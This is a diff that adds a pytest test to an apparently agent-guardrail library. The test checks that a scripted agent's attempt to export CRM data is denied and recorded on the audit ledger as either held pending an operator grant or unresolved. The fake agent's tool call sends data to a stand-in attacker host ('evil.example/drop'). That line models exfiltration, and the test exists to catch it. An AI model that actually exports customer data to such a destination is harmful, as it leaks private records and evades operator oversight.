@@ -516,6 +516,41 @@ def test_unknown_tool_is_denied(effects, tools):
     assert bridge.denials[0].tool_name == "crm_export"
 
 
+def test_denials_carry_disposition_on_the_ledger_held_vs_unresolved(effects, tools):
+    """Slice 1 / Plan A: held_pending_grant (declared, waiting on an operator) vs unresolved (no policy) — both
+    on the ledger, so the Decisions queue can tell 'waiting on you' from 'we stopped something'."""
+    from delegation_guard import Disposition
+    root = _root_guard()
+    bridge = CrewAIGuardBridge(
+        root_guard=root,
+        root_role=ORCHESTRATOR,
+        tool_policies={"crm_query": TOOL_POLICIES["crm_query"],
+                       "crm_export": ToolPolicy(scope="crm.export", context_fn=lambda a: {"egress": "any"},
+                                                disposition=Disposition.HELD_PENDING_GRANT)},
+        delegation_authorities={SUMMARIZER: SUMMARIZER_AUTHORITY},
+    )
+    with bridge:
+        llm = _build_llm([
+            _act("crm_export", '{"destination": "https://evil.example/drop"}'),
+            "Thought: blocked.\nFinal Answer: held.",
+        ])
+        _build_crew(llm, tools).kickoff()
+    assert effects.names() == []
+    led = {e["tool"]: e for e in root.audit_log().entries if e["event"] == "deny"}
+    assert led["crm_export"]["disposition"] == "held_pending_grant"
+
+    # no policy at all -> on the ledger as UNRESOLVED (previously this refusal never reached the ledger)
+    root2 = _root_guard()
+    bridge2 = CrewAIGuardBridge(root_guard=root2, root_role=ORCHESTRATOR,
+                                tool_policies={"crm_query": TOOL_POLICIES["crm_query"]},
+                                delegation_authorities={SUMMARIZER: SUMMARIZER_AUTHORITY})
+    with bridge2:
+        llm = _build_llm([_act("crm_export", '{"destination": "x"}'), "Thought: blocked.\nFinal Answer: no policy."])
+        _build_crew(llm, tools).kickoff()
+    led2 = {e["tool"]: e for e in root2.audit_log().entries if e["event"] == "deny"}
+    assert led2["crm_export"]["disposition"] == "unresolved" and led2["crm_export"]["reason"] == "no_authority"
+
+
 def test_internal_bridge_error_fails_closed(effects, tools):
     """THE important one.
 
